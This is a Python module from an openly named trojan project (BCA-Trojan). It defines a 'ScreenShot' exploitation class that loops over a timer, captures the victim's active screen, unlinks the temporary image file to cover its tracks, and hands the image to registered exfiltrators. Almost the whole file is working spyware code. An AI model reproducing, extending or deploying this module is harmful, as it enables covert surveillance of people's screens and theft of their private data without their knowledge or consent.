#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

import os
import time
from pathlib import Path

from mss import mss

from src.modules import ExploitationModule


class ScreenShot(ExploitationModule):
    def __init__(self, *,
                 image_path: [str, Path],
                 exfil_time: float = None):
        """Take a screenshot of the currently active monitor and send
        the results to pre-configured exfiltration methods.

        :param image_path: A string or instance of pathlib.Path
            containing the absolute path to the location where the
            screenshot file will be temporarily written to before
            exfiltration.
        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to None
            to perform a single operation.
        """
        super().__init__(exfil_time)
        self._image_path = Path(image_path)

    @property
    def contents(self) -> Path:
        return self._image_path

    def execute(self):
        """Take a screenshot and send it as an attachment to all
        registered exfiltrators."""
        while True:
            with mss() as screen:
                screen.shot(output=str(self._image_path))
            with open(file=self._image_path, mode="rb") as fd:
                os.unlink(self._image_path)
                self._notify_all_exfiltrators(message=fd)
            try:
                time.sleep(self.exfil_time)
            except TypeError:
                break
